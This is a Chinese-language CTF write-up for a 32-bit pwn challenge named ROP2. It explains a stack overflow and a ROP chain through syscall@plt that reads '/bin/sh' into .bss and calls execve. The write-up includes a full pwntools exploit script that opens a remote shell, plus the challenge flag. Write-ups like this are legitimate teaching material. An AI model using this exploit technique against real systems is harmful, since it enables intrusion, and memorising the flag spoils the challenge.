# PHM #61 Pwn — ROP2

| 項目 | 值 |
|:---|:---|
| 類別 | Pwn |
| 分數 | 100 |
| 連線 | `nc ctf.hackme.quest 7703` |
| 檔案 | [`/static/rop2`](https://ctf.hackme.quest/static/rop2) (ELF 32-bit, dynamically linked, not stripped) |
| 提示 | ROPgadget not working anymore |
| 保護 | NX enabled, No canary, No PIE |

## 分析

`overflow()`: `read(0, ebp-0xc, 0x400)` → 溢位 (到 ret 距離 `0xc+4 = 16`), read 不受 `\n`/`\0` 限制。

binary 超小, 幾乎沒有好用 gadget (這就是題名 "ROPgadget not working anymore")。**但 PLT 裡有 `syscall@plt`** — libc 的 `syscall(num, a1, a2, a3)` wrapper, 等於讓我們直接下任何 syscall。

關鍵 gadget: `0x8048578 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret` (一次清 4 個參數, 讓兩次 `syscall()` 呼叫可以串接)。

## 解法

`.bss` 固定 (No PIE), 先 `read` 把 `/bin/sh` 塞進 `.bss`, 再 `execve`:

1. `syscall(3, 0, bss, 8)` = `read(0, bss, 8)` → 我們隨後送 `"/bin/sh\0"`。
2. `syscall(11, bss, 0, 0)` = `execve(bss, 0, 0)`。

cdecl: ret 進 `syscall@plt` 時 `[esp]=返回位址`(指向 pop4 清參數), `[esp+4..]=num,a1,a2,a3`。

```python
from pwn import *
context(arch='i386', os='linux')
sysplt=0x8048320; pop4=0x8048578; bss=0x804a020+0x100
p  = b'A'*16
p += p32(sysplt)+p32(pop4)+p32(3) +p32(0)  +p32(bss)+p32(8)   # read(0,bss,8)
p += p32(sysplt)+p32(pop4)+p32(11)+p32(bss)+p32(0)  +p32(0)   # execve(bss,0,0)
r=remote('ctf.hackme.quest',7703)
r.send(p); time.sleep(1); r.send(b'/bin/sh\x00'); time.sleep(1)
r.sendline(b'cat flag'); print(r.recvall())
```

## Flag

```
FLAG{Wow, you really know how to ROP!!!...V2rhMIjGNYqQ3Uyx}
```

## 感想

沒 gadget 不代表沒戲 — 只要 PLT 有 `syscall`, 就能用「`syscall@plt` + 清參數 gadget」串出任意系統呼叫, 連 `pop eax/ebx/ecx/edx` 都省了。read 到固定位址的 `.bss` 再 execve, 是 No-PIE 動態 binary 的經典解。
